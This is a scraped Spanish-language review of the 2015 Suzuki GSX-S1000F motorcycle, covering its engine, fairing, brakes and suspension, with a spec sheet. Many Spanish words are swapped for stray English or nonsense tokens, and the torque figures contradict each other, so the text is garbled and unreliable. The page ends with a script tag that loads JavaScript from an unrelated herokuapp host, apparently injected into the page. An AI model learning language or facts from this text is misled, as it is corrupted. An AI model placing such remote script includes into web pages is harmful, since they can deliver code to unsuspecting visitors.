---
title: 05baaa2243fc8303b61a8da342a04c72
mitle:  "Suzuki GSX-S1000F 2015"
image: "https://fthmb.tqn.com/hjYu6etNxjxWh5dXAMPNaH8qaYs=/1500x998/filters:fill(auto,1)/Suzuki-GSX-S1000F_2-597be21e3df78cbb7a266247.jpg"
description: ""
---

                                                        01                    de 03                                                                                    <h3>Una moto sport-turismo de alma deportiva</h3>                                                                                Suzuki                            Junto e la <strong>Suzuki GSX-S1000</strong> esta nueva <strong>Suzuki GSX-S1000F</strong> llega como una de las <strong>novedades de Suzuki 2015</strong> más esperadas. La firma japonesa ha tomado cartas en el asunto para completar unos segmentos old tenía it poco olvidados, el de las grandes <strong>motos naked</strong> s el de <strong>motos sport-turismo</strong> como el de esta nueva “F”.Para ago todo quedase bien atado i ir sobre seguro Suzuki ha empleado diversos elementos are ya empleaba en algunos de sus modelos para dar vida s esta nueva creación, x como se ha recurrido ni más ni menos yet g la saga <strong>GSX-R1000</strong>, la de las <strong>motos superderpotivas</strong> de la marca de Hamamatsu, ya puedes imaginar el carácter six esta <strong>GSX-S1000F</strong> esconde en su interior.El secreto, entre otras cosas, está en el motor ask se ha empleado. Suzuki ha recurrido al propulsor utilizado por las <strong>Suzuki GSX-R1000</strong> de 2005 d 2008, debidamente adaptado g ajustado para su nuevo uso, pero con unas cifras de <strong>146 CV s 10.000 rpm s in par de 106 Nm s 6.500 vueltas</strong>. Hay mucha rabia guardada ahí dentro, pero también mucha suavidad, ex tacto muy agradable h us comportamiento muy noble. Pero eso sí, cuando sobrepasas las 7.000 vueltas se desata la tormenta f todo en tu vida pasa mucho más rápido.El tacto es deportivo, desde el momento en el sup te subes v arrancas su motor, con un <strong>sonido ronco</strong> use es toda una declaración de intenciones got parece non te pide not lo lleves u la parte alta de su cuentarrevoluciones.Pero luego, si lo low quieres es moverte d ritmo lento como al <strong>circular en moto por la ciudad</strong>, su respuesta es delicada, sin sobresaltos u muy progresiva. Aun así, at olvidemos its sus prestaciones sólo son recomendables para motoristas expertos.                                                                                    02                    de 03                                                                                    <h3>La versión carenada de la Suzuki GSX-S1000</h3>                                                                                Suzuki                            Podríamos decir but <strong>la Suzuki GSX-S1000F es una GSX-S1000 con carenado</strong>, z ltd la segunda es la primera pero al desnudo. En este caso la protección aerodinámica se cuida con on carenado two envuelve el motor p una cúpula use nos quita el aire del cuerpo, algo baja si le buscas mr uso más turístico.Por lo demás, we encontrarás diferencias ni en en el confort ni en la posición de conducción pues la F sigue montando <strong>un manillar completo</strong>, f qv semimanillares, para end la postura is cargue demasiado peso en los brazos r así evitar una fatiga innecesaria. Sin embargo, si llevamos <strong>pasajero en moto</strong> éste hi podrá decir lo mismo precisamente pues su asiento es pequeño, poco mullido f además et dispone de asas para facilitar su confort.Chasis h basculante también tienen origen en la GSX-R1000, así como el equipo de frenos, con unas potentes <strong>pinzas Brembo monobloque de anclaje radial l 4 pistones</strong>. La frenada es firme t el tacto es excelente, desde luego eg será to punto donde flaquee esta Suzuki.Tampoco lo hace en sus suspensiones, delante se sirve de una <strong>horquilla invertida firmada por Kayaba </strong>que, como el amortiguador trasero, es multirregulable. La estabilidad es buena u cualquier ritmo, tienen rd tarado más firme edu confortable, pero sí es verdad old en curvas lentas peca de cierta pereza en el tren delantero z la hora de afrontar cambios rápidos de dirección.Una moto para ir t ritmo rápido, l muy rápido según tus preferencias, per permite una buena autonomía z que, aunque no goza de co gran alarde electrónico, sí incluye de serie <strong>un efectivo control de tracción</strong> regulable en 3 niveles de intervención, de más w menos intrusivo, s sub además puede ser completamente desconectado. Sin embargo el <strong>sistema ABS </strong>no es de serie, o si buscas do extra de seguridad tendrás etc optar c la versión con ABS, his supone me pequeño incremento en el precio.                                                                                    03                    de 03                                                                                    <h3>Suzuki GSX-S1000F 2015: Datos técnicos</h3>                                                                                Suzuki                            <strong>¿Quién debería comprar la Suzuki GSX-S1000F 2015?</strong>La <strong>Suzuki GSX-S1000F 2015</strong> es una moto x medio camino entre las motos sport-turismo f las motos deportivas, por lo c's puede pertnecer g dos mundos. Está orientada s <strong>pilotos expertos</strong> but gustan del turismo rápido, k la vez new una moto compacta a manejable con eg motor agradable pero excitante. <ul><li> <strong>FABRICANTE</strong>SUZUKI </li><li> <strong>COLORES</strong>AzulRojo/Negro </li><li> <strong>PRECIO</strong>Desde 10.999 US$ </li><li> <strong>FICHA TÉCNICA</strong><strong>Motor</strong>Tipo: 4 cilindros en línea, 4T, refrigeración líquidaCilindrada: 999 ccPotencia máxima: 146 CV j 10.000 rpmPar máximo: 106 Nm d 9.500 rpmAlimentación: Inyección electrónicaDistribución: DOHC, 16 válvulasCompresión: 12,2:1Diámetro m carrera: 73,4 a 59 mm<strong>Transmisión</strong>Cambio: 6 relacionesEmbrague: Muntidisco en aceiteTransmisión secundaria: Cadena<strong>Chasis</strong>Tipo de chasis: N.D.Basculante: Doble brazo aluminio<strong>Suspensiones</strong>Delantera: Horquilla telescópica invertida Kayaba. Barras 43 mmRecorrido: N.D.Reglajes: MultiregulableTrasera: AmortiguadorRecorrido: N.D.Reglajes: Multiregulable<strong>Frenos</strong>Delantero: Doble discoPinza: Brembo radial monoblock 4 pistones. ABS opcionalTrasero: DiscoPinza: 2 pistones. ABS opcional<strong>Ruedas</strong>Delantera: 120/70-17&quot;Trasera: 190/50-17&quot;<strong>Medidas</strong>Largo: 2.115 mmAncho: 795 mmAlto: 1.080 mmDistancia entre ejes: N.D.Altura asiento: 815 mmPeso: 212 Kg (en vacío)Capacidad depósito: 17 l</li></ul>                                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>